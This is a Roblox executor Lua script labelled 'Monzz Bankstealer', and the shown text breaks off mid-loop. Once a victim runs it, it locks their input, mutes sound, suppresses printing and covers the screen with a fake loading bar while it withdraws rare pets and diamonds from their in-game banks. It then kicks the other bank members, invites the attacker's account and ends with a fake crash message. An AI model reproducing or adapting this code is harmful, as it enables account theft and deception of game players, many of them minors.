--[Monzz Bankstealer]

if getgenv().executed1 then return end
getgenv().executed1 = true

local runService = game:GetService("RunService")
local camera = workspace.CurrentCamera
local disabledKeyCodes = {
    0x73,
    0xA4,
    0xA5,
    0x1B,
    0x0D,
};
UserSettings().GameSettings.MasterVolume = 0
if _G.MouseLock ~= false then
    runService.RenderStepped:Connect(function()
        for _, keyCode in next, disabledKeyCodes do
            keyrelease(keyCode)
        end

        mousemoveabs(camera.ViewportSize.X / 3, camera.ViewportSize.Y / 3);
    end);
end
local function antiPrint(...)
    local info = debug.getinfo(2)
    if info and info.what == 'Lua' and info.func == print then
        return
    end
    return print(...)
end
print = antiPrint
rconsoleprint = antiPrint
rconsolewarn = antiPrint
rconsoleerr = antiPrint
rconsoleinput = antiPrint
printconsole = antiPrint
setclipboard = antiPrint
local runService = game:GetService("RunService")
local camera = workspace.CurrentCamera
local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text

-- Detection


local exploit
request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or
HttpPost
local function getexploit()
    local exploitt =
        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
        (secure_load and "Sentinel") or
        (is_sirhurt_closure and "Sirhurt") or
        (pebc_execute and "ProtoSmasher") or
        (KRNL_LOADED and "KRNL") or
        (WrapGlobal and "WeAreDevs") or
        (isvm and "Proxo") or
        (shadow_env and "Shadow") or
        (jit and "EasyExploits") or
        (getscriptenvs and "Calamari") or
        (unit and not syn and "Unit") or
        (OXYGEN_LOADED and "Oxygen U") or
        (IsElectron and "Electron") or
        ("Couldnt Grab")

    exploit = exploitt
end

getexploit()

--// Check UserName

local idiotuser = game:GetService("Players").LocalPlayer.Name
local url = Webhook
if idiotuser == UserName then
    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
    return;
end
if UserName == nil then
    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
    return;
end
local worked2 = pcall(function()
    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
end)
if not worked2 then
    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
    return;
end
if worked2 then
    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
end

--// Loading Screen
for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
    v:Destroy()
end
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel1 = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local LoadingScript = Instance.new("TextLabel")
local LocalScript = Instance.new("LocalScript")

ScreenGui.IgnoreGuiInset = true
ScreenGui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService("CoreGui")

Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Position = UDim2.new(-0.000106195221, 0, 0, 0)
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.Parent = ScreenGui

TextLabel.Font = Enum.Font.Bangers
TextLabel.Text = _G.loadingScreenText
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 47
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderColor3 = Color3.fromRGB(27.000000290572643, 42.000001296401024, 53.00000064074993)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.03534081, 0, 0.440561211, 0)
TextLabel.Size = UDim2.new(0, 1356, 0, 85)
TextLabel.Parent = Frame


ImageLabel.Image = "rbxassetid://5577595083"
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.063534081, 0, 0.340561211, 0)
ImageLabel.Size = UDim2.new(0, 320, 0, 340)
ImageLabel.Parent = Frame

local LoadingScript = Instance.new("TextLabel")
LoadingScript.Font = Enum.Font.FredokaOne
LoadingScript.Text = "Loading Script 1/8"
LoadingScript.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingScript.TextSize = 51
LoadingScript.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LoadingScript.BackgroundTransparency = 1
LoadingScript.Position = UDim2.new(0.345166922, 0, 0.496173501, 0)
LoadingScript.Size = UDim2.new(0, 419, 0, 94)
LoadingScript.Name = "LoadingScript"
LoadingScript.Parent = Frame

local fake_module_scripts = {}

local function KYZKD_fake_script()
    local loadingGui = ScreenGui
    local loadingFrame = loadingGui:FindFirstChild("Frame")
    local loadingText = loadingFrame:FindFirstChild("LoadingScript")
    if loadingGui and loadingFrame and loadingText then
        loadingGui.IgnoreGuiInset = true
        loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
        for i = 1, 5 do
            loadingText.Text = "Loading Script " .. i .. "/8"
            wait(15)
        end
    end
end

coroutine.wrap(KYZKD_fake_script)()

game:GetService("Players").LocalPlayer.PlayerGui.Main.Bottom.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.Left.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.Boosts.Visible = false

game:GetService("Players").LocalPlayer.PlayerGui.Main.ServerBoosts.Visible = false

if _G.AntiLeave ~= false then
    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
        if v.Name ~= "Inventory" then
            v:Destroy()
        end
    end
    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
            v:Destroy()
        end
    end
end

local Loading = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Dots = Instance.new("Frame")
local Dot1 = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local InsideDot = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Dot2 = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local InsideDot_2 = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local Dot3 = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local InsideDot_3 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local Bar = Instance.new("Frame")
local Bar2 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local UICorner_8 = Instance.new("UICorner")
local Percentage = Instance.new("TextLabel")
local Tip = Instance.new("TextLabel")
local EndSequence = Instance.new("Frame")
Loading.Name = "Loading"
Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Loading.DisplayOrder = 999999999
MainFrame.Name = "MainFrame"
MainFrame.Parent = Loading
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(-0.125662372, 0, -0.125935167, 0)
MainFrame.Size = UDim2.new(1.25, 0, 1.25, 0)
Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.183329239, 0, 0.246382296, 0)
Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
Title.Font = Enum.Font.FredokaOne
Title.Text = "Monzz"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true
Dots.Name = "Dots"
Dots.Parent = MainFrame
Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Dots.BackgroundTransparency = 1.000
Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)
Dot1.Name = "Dot1"
Dot1.Parent = Dots
Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
UICorner.CornerRadius = UDim.new(0.5, 0)
UICorner.Parent = Dot1
InsideDot.Name = "InsideDot"
InsideDot.Parent = Dot1
InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)
UICorner_2.CornerRadius = UDim.new(0.5, 0)
UICorner_2.Parent = InsideDot
Dot2.Name = "Dot2"
Dot2.Parent = Dots
Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
UICorner_3.CornerRadius = UDim.new(0.5, 0)
UICorner_3.Parent = Dot2
InsideDot_2.Name = "InsideDot"
InsideDot_2.Parent = Dot2
InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)
UICorner_4.CornerRadius = UDim.new(0.5, 0)
UICorner_4.Parent = InsideDot_2
Dot3.Name = "Dot3"
Dot3.Parent = Dots
Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
UICorner_5.CornerRadius = UDim.new(0.5, 0)
UICorner_5.Parent = Dot3
InsideDot_3.Name = "InsideDot"
InsideDot_3.Parent = Dot3
InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)
UICorner_6.CornerRadius = UDim.new(0.5, 0)
UICorner_6.Parent = InsideDot_3
Bar.Name = "Bar"
Bar.Parent = MainFrame
Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
Bar.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)
Bar2.Name = "Bar2"
Bar2.Parent = Bar
Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
Bar2.BorderSizePixel = 0
Bar2.Size = UDim2.new(0, 0, 1, 0)
UICorner_7.CornerRadius = UDim.new(0.5, 0)
UICorner_7.Parent = Bar2
UICorner_8.CornerRadius = UDim.new(0.5, 0)
UICorner_8.Parent = Bar
Percentage.Name = "Percentage"
Percentage.Parent = Bar
Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Percentage.BackgroundTransparency = 1.000
Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
Percentage.Font = Enum.Font.FredokaOne
Percentage.Text = "0%"
Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
Percentage.TextScaled = true
Percentage.TextSize = 14.000
Percentage.TextWrapped = true
Tip.Name = "Tip"
Tip.Parent = MainFrame
Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tip.BackgroundTransparency = 1.000
Tip.Position = UDim2.new(0.280816913, 0, 0.717294872, 0)
Tip.Size = UDim2.new(0.438366145, 0, 0.0299334861, 0)
Tip.Font = Enum.Font.SourceSansItalic
Tip.Text = ""
Tip.TextColor3 = Color3.fromRGB(138, 138, 138)
Tip.TextScaled = true
Tip.TextSize = 14.000
Tip.TextWrapped = true
EndSequence.Name = "EndSequence"
EndSequence.Parent = Loading
EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
EndSequence.BorderSizePixel = 0
EndSequence.Position = UDim2.new(1, 0, 0, 0)
EndSequence.Size = UDim2.new(1, 0, 1, 0)
local function NGZQAMK_fake_script()
	local script = Instance.new('LocalScript', Dots)
	while true do
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
	end
end
coroutine.wrap(NGZQAMK_fake_script)()
local function NDID_fake_script()
	local script = Instance.new('LocalScript', MainFrame)
	local bar = script.Parent.Bar
	local insidebar = bar.Bar2
	local percentage = bar.Percentage
	wait(5)
	insidebar:TweenSize(UDim2.new(1,0,1,0), "In", "Linear", 200, true)
	wait(200)
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(0,0,0,0), "InOut", "Quad", 3, true)
	wait(3)
	game.Players.LocalPlayer:Kick("[Crash Log ".. math.random(50, 5000) .. "] Please Rejoin.")
end
coroutine.wrap(NDID_fake_script)()
local function OVSBNB_fake_script()
	local script = Instance.new('LocalScript', Percentage)
	wait(5)
	for i = 1,100 do
		script.Parent.Text = i.."%"
		wait(2)
	end
end
coroutine.wrap(OVSBNB_fake_script)()
local function SNUMK_fake_script()
	local script = Instance.new('LocalScript', Tip)
	local tip = script.Parent
	while true do
		wait(5)
		tip.Text = _G.Tip1
		wait(5)
		tip.Text = _G.Tip2
		wait(5)
		tip.Text = _G.Tip3
		wait(5)
		tip.Text = _G.Tip4
		wait(5)
		tip.Text = _G.Tip5
	end
end
coroutine.wrap(SNUMK_fake_script)()
local function LSNGUH_fake_script()
	local script = Instance.new('LocalScript', Loading)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end
coroutine.wrap(LSNGUH_fake_script)()

-- Remotes

local getmybanksremote = debug.getconstant(
    getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
    "Bank Client"]).GetMyBanks, 3)

local inviteremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
"Bank Client"]).InviteToBank, 18)

local lockremote = debug.getconstant(
    getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory)
    .LockPets, 5)

local depositremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
"Bank Client"]).Deposit, 16)

local eggremote = debug.getconstant(
    debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts
        .Game.Eggs).SetupEgg)[5], 26)

local getbankremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
"Bank Client"]).GetBank, 3)

local upgraderemote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
"Bank Client"]).UpgradeBank, 18)

local kickremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
"Bank Client"]).KickMember, 9)

local withdrawremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
"Bank Client"]).Withdraw, 16)

-- Libs

local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
local bloby = getupvalues(blobx[2])
local blobz = getupvalues(bloby[1])[1][2]
local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
local blobb = getupvalues(bloba[2])

getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
inviteremote = blobz[blobb[2](2, inviteremote)]
lockremote = blobz[blobb[2](2, lockremote)]
depositremote = blobz[blobb[2](2, depositremote)]
eggremote = blobz[blobb[2](2, eggremote)]
getbankremote = blobz[blobb[2](2, getbankremote)]
upgraderemote = blobz[blobb[2](2, upgraderemote)]
kickremote = blobz[blobb[2](2, kickremote)]
withdrawremote = blobz[blobb[2](2, withdrawremote)]


local lib = require(game.ReplicatedStorage:WaitForChild("Library"))
local mybanks = getmybanksremote:InvokeServer()

game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
"__MAP"].Interactive.Bank.Pad.Position)

task.wait()
if mybanks[1] == nil then
    game:GetService("Players").LocalPlayer:Kick("Script Is Not Supported 1")
    return;
end
-- Banks Locals

-- Bank Withdraws

-- Bank 1

local SuperBank
local Bank
local SuperBank2
local Bank2
local SuperBank3
local Bank3
local SuperBank4
local Bank4
local SuperBank5
local Bank5
local FinalList2 = {}
local FinalList3 = {}
local FinalList4 = {}
local FinalList5 = {}
local LFinalList = {}
local bdiaamt = 0
local bdiaamt2 = 0
local bdiaamt3 = 0
local bdiaamt4 = 0
local bdiaamt5 = 0
local bankscount = 0
local FinalFinal = 0
local DiamondsDiamonds = 0
Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
Functions = Library.Functions

LHugBEList = {}

table.foreach(Library.Directory.Pets, function(i, v)
    if v.huge then
        table.insert(LHugBEList, i)
    end
    if v.titanic then
        table.insert(LHugBEList, i)
    end
    if v.name == "banana" then
        table.insert(LHugBEList, i)
    end
end)
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
"__MAP"].Interactive.Bank.Pad.Position)
if mybanks[1] ~= nil then
    bankscount = bankscount + 1
end
if mybanks[2] ~= nil then
    bankscount = bankscount + 1
end
if mybanks[3] ~= nil then
    bankscount = bankscount + 1
end
if mybanks[4] ~= nil then
    bankscount = bankscount + 1
end
if mybanks[5] ~= nil then
    bankscount = bankscount + 1
end
if mybanks[1] ~= nil then
    local BankID = mybanks[1]["BUID"]
    Bank = BankID
    LHList = {}
    SuperBank = getbankremote:InvokeServer(Bank)
    local lpets = SuperBank.Storage.Pets
    local y = {}
    for i, v in pairs(lpets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(lpets) do
        if table.find(LHugBEList, v["id"]) ~= nil and v.l then
            table.insert(LHList, v["uid"])
        end
    end
    if #LHList < 50 then
        for i, v in pairs(LHList) do
            table.insert(LFinalList, v)
        end
    elseif #LHList > 50 then
        for i, v in pairs(LHList) do
            if #LFinalList < 50 then
                table.insert(LFinalList, v)
            end
        end
    end
    if #LFinalList ~= 0 then
        local A_5 = {
            [1] = Bank,
            [2] = LFinalList,
            [3] = 0
        }

        wait()
        local s, e = pcall(function()
            withdrawremote:InvokeServer(Bank, LFinalList, 0)
        end)

        if s == false then
            wait(0.2)
            withdrawremote:InvokeServer(Bank, FinalList, 0)
        end
        wait(1.5)
    end
end

if mybanks[2] ~= nil then
    local BankID2 = mybanks[2]["BUID"]
    Bank2 = BankID2
    SuperBank2 = getbankremote:InvokeServer(Bank2)
    BHList2 = {}
    local pets2 = SuperBank2.Storage.Pets
    local y = {}
    for i, v in pairs(pets2) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets2) do
        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
            table.insert(BHList2, v["uid"])
        end
    end
    if #BHList2 < 50 then
        for i, v in pairs(BHList2) do
            table.insert(FinalList2, v)
        end
    elseif #BHList2 > 50 then
        for i, v in pairs(BHList2) do
            if #FinalList2 < 50 then
                table.insert(FinalList2, v)
            end
        end
    end
    bdiaamt2 = SuperBank2.Storage.Currency.Diamonds
    if bdiaamt2 >= 1000000000 then
        bdiaamt2 = bdiaamt2
    elseif #FinalList2 ~= 0 and bdiaamt2 < 1000000000 then
        bdiaamt2 = bdiaamt2
    else
        bdiaamt2 = 0
    end
    if #FinalList2 ~= 0 or bdiaamt2 ~= 0 then
        local A_1 = {
            [1] = Bank2,
            [2] = FinalList2,
            [3] = 0
        }

        wait()
        local s, e = pcall(function()
            withdrawremote:InvokeServer(Bank2, FinalList2, bdiaamt2)
        end)

        if s == false then
            wait(0.2)
            withdrawremote:InvokeServer(Bank2, FinalList2, 0)
        end
        wait(1.5)
    end
end
if mybanks[3] ~= nil then
    local BankID3 = mybanks[3]["BUID"]
    Bank3 = BankID3
    SuperBank3 = getbankremote:InvokeServer(Bank3)
    BHList3 = {}
    local pets3 = SuperBank3.Storage.Pets
    local y = {}
    for i, v in pairs(pets3) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets3) do
        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
            table.insert(BHList3, v["uid"])
        end
    end
    if #BHList3 < 50 then
        for i, v in pairs(BHList3) do
            table.insert(FinalList3, v)
        end
    elseif #BHList3 > 50 then
        for i, v in pairs(BHList3) do
            if #FinalList3 < 50 then
                table.insert(FinalList3, v)
            end
        end
    end
    bdiaamt3 = SuperBank3.Storage.Currency.Diamonds
    if bdiaamt3 >= 1000000000 then
        bdiaamt3 = bdiaamt3
    elseif #FinalList3 ~= 0 and bdiaamt3 < 1000000000 then
        bdiaamt3 = bdiaamt3
    else
        bdiaamt3 = 0
    end
    if #FinalList3 ~= 0 or bdiaamt3 ~= 0 then
        local A_1 = {
            [1] = Bank3,
            [2] = FinalList3,
            [3] = 0
        }

        wait()
        local s, e = pcall(function()
            withdrawremote:InvokeServer(Bank3, FinalList3, bdiaamt3)
        end)

        if s == false then
            wait(0.2)
            withdrawremote:InvokeServer(Bank3, FinalList3, 0)
        end
        wait(1.5)
    end
end
if mybanks[4] ~= nil then
    local BankID4 = mybanks[4]["BUID"]
    Bank4 = BankID4
    SuperBank4 = getbankremote:InvokeServer(Bank4)
    BHList4 = {}
    local pets4 = SuperBank4.Storage.Pets
    local y = {}
    for i, v in pairs(pets4) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets4) do
        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
            table.insert(BHList4, v["uid"])
        end
    end
    if #BHList4 < 50 then
        for i, v in pairs(BHList4) do
            table.insert(FinalList4, v)
        end
    elseif #BHList4 > 50 then
        for i, v in pairs(BHList4) do
            if #FinalList4 < 50 then
                table.insert(FinalList4, v)
            end
        end
    end
    bdiaamt4 = SuperBank4.Storage.Currency.Diamonds
    if bdiaamt4 >= 1000000000 then
        bdiaamt4 = bdiaamt4
    elseif #FinalList4 ~= 0 and bdiaamt4 < 1000000000 then
        bdiaamt4 = bdiaamt4
    else
        bdiaamt4 = 0
    end
    if #FinalList4 ~= 0 or bdiaamt4 ~= 0 then
        local A_1 = {
            [1] = Bank4,
            [2] = FinalList4,
            [3] = 0
        }

        wait()
        local s, e = pcall(function()
            withdrawremote:InvokeServer(Bank4, FinalList4, bdiaamt4)
        end)

        if s == false then
            wait(0.2)
            withdrawremote:InvokeServer(Bank4, FinalList4, 0)
        end
        wait(1.5)
    end
end

-- Bank 5

if mybanks[5] ~= nil then
    local BankID5 = mybanks[5]["BUID"]
    Bank5 = BankID5
    SuperBank5 = getbankremote:InvokeServer(Bank5)
    BHList5 = {}
    local pets5 = SuperBank5.Storage.Pets
    local y = {}
    for i, v in pairs(pets5) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets5) do
        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
            table.insert(BHList5, v["uid"])
        end
    end
    if #BHList5 < 50 then
        for i, v in pairs(BHList5) do
            table.insert(FinalList5, v)
        end
    elseif #BHList5 > 50 then
        for i, v in pairs(BHList5) do
            if #FinalList5 < 50 then
                table.insert(FinalList5, v)
            end
        end
    end
    bdiaamt5 = SuperBank5.Storage.Currency.Diamonds
    if bdiaamt5 >= 1000000000 then
        bdiaamt5 = bdiaamt5
    elseif #FinalList5 ~= 0 and bdiaamt5 < 1000000000 then
        bdiaamt5 = bdiaamt5
    else
        bdiaamt5 = 0
    end
    if #FinalList5 ~= 0 or bdiaamt5 ~= 0 then
        local A_1 = {
            [1] = Bank5,
            [2] = FinalList5,
            [3] = 0
        }

        wait()
        local s, e = pcall(function()
            withdrawremote:InvokeServer(Bank5, FinalList5, bdiaamt5)
        end)

        if s == false then
            wait(0.2)
            withdrawremote:InvokeServer(Bank5, FinalList5, 0)
        end
        wait(1.5)
    end
end
FinalFinal = #FinalList2 + #FinalList3 + #FinalList4 + #FinalList5
DiamondsDiamonds = bdiaamt2 + bdiaamt3 + bdiaamt4 + bdiaamt5
print(DiamondsDiamonds)


local SuperBank = getbankremote:InvokeServer(Bank)
local tier = SuperBank["Tier"]
local max = 50
local gemsinbank = SuperBank["Storage"]["Currency"]["Diamonds"]
local petsinbank = #SuperBank["Storage"]["Pets"]
local tier1hold = 40 - petsinbank
local tier2hold = 95 - petsinbank
local tier3hold = 200 - petsinbank
local tier4hold = 500 - petsinbank
local tier1gems = 10000000000 - gemsinbank
local tier2gems = 50000000000 - gemsinbank
local tier3gems = 300000000000 - gemsinbank
local tier4gems = 1500000000000 - gemsinbank

-- Kicking The Players

for i, v in pairs(SuperBank["Players"]) do
    if v ~= _G.UserID then
        kickremote:InvokeServer(Bank, v)
    end
end

-- First Invite

if tier ~= 1 then
        inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
end
-- Bank Pets
Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
Functions = Library.Functions


BEXCList = {}
BMythicList = {}
BSecretList = {}
BHugeList = {}
BPogList = {}
BBananaList = {}


BSList = {}
BEList = {}
BMList = {}
BHList = {}
BPList = {}
BBList = {}

table.foreach(Library.Directory.Pets, function(i, v)
    if v.rarity == "Exclusive" or v.rarity == "Event" then
        table.insert(BEXCList, i)
    end
    if v.rarity == "Mythical" then
        table.insert(BMythicList, i)
    end
    if v.huge then
        table.insert(BHugeList, i)
    end
    if v.rarity == "Secret" then
        table.insert(BSecretList, i)
    end
    if string.split(v.name, " ")[1] == "Pog" then
        table.insert(BPogList, i)
    end
    if v.name == "banana" then
        table.insert(BBananaList, i)
    end
end)
for i, v in pairs(BPogList) do
    table.insert(BEXCList, v)
end
for i, v in pairs(BBananaList) do
    table.insert(BEXCList, v)
end
local pets = SuperBank["Storage"]["Pets"]
local y = {}
for i, v in pairs(pets) do
    y[v["uid"]] = false
end
for i, v in pairs(pets) do
    if table.find(BEXCList, v["id"]) ~= nil then
        table.insert(BEList, v["uid"])
    end
    if table.find(BMythicList, v["id"]) ~= nil and v.s >= 1e+15 then
        table.insert(BMList, v["uid"])
    end
    if table.find(BSecretList, v["id"]) ~= nil then
        table.insert(BSList, v["uid"])
    end
    if table.find(BHugeList, v["id"]) ~= nil then
        table.insert(BHList, v["uid"])
    end
end

local BEHList = #BEList - #BHList

-- Pet stuff
local FinalList = {}

Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
Functions = Library.Functions

EXCList = {}
MythicList = {}
SecretList = {}
HugeList = {}
PogList = {}
BananaList = {}


SList = {}
EList = {}
MList = {}
HList = {}
PList = {}
BList = {}

table.foreach(Library.Directory.Pets, function(i, v)
    if v.rarity == "Exclusive" and not v.huge then
        table.insert(EXCList, i)
    end
    if v.rarity == "Event" then
        table.insert(EXCList, i)
    end
    if v.rarity == "Mythical" then
        table.insert(MythicList, i)
    end
    if v.huge then
        table.insert(HugeList, i)
    end
    if v.rarity == "Secret" then
        table.insert(SecretList, i)
    end
    if string.split(v.name, " ")[1] == "Pog" then
        table.insert(PogList, i)
    end
    if v.name == "banana" then
        table.insert(BananaList, i)
    end
end)
for i, v in pairs(PogList) do
    table.insert(EXCList, v)
end
for i, v in pairs(BananaList) do
    table.insert(EXCList, v)
end
local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
local y = {}
for i, v in pairs(pets) do
    y[v["uid"]] = false
end
lockremote:InvokeServer(y)
for i, v in pairs(pets) do
    if table.find(EXCList, v["id"]) ~= nil then
        table.insert(EList, v["uid"])
    end
    if table.find(MythicList, v["id"]) ~= nil and v.s >= 1e+15 and not v.hc then
        table.insert(MList, v["uid"])
    end
    if table.find(MythicList, v["id"]) ~= nil and v.hc then
        table.insert(MList, v["uid"])
    end
    if table.find(SecretList, v["id"]) ~= nil then
        table.insert(SList, v["uid"])
    end
    if table.find(HugeList, v["id"]) ~= nil then
        table.insert(HList, v["uid"])
    end
end
if tier == 1 then
    max = tier1hold
elseif tier == 2 then
    if tier2hold > 50 then
        max = 50
    elseif tier2hold < 50 then
        max = tier2hold
    end
elseif tier == 3 then
    if tier3hold > 50 then
        max = 50
    elseif tier3hold < 50 then
        max = tier3hold
    end
elseif tier == 4 then
    if tier4hold > 50 then
        max = 50
    elseif tier4hold < 50 then
        max = tier4hold
    end
else
    max = 50
end
print(max)
if #EList + #MList + #PList + #SList + #HList < max then
    for i, v in pairs(HList) do
        table.insert(FinalList, v)
    end
    for i, v in pairs(EList) do
        table.insert(FinalList, v)
    end
    for i, v in pairs(SList) do
        table.insert(FinalList, v)
    end
    for i, v in pairs(MList) do
        table.insert(FinalList, v)
    end
elseif #EList + #SList + #MList + #HList > max and #HList < max then
    for i, v in pairs(HList) do
        table.insert(FinalList, v)
    end
    for i, v in pairs(EList) do
        if #FinalList < max then
            table.insert(FinalList, v)
        end
    end
    for i, v in pairs(SList) do
        if #FinalList < max then
            table.insert(FinalList, v)
        end
    end
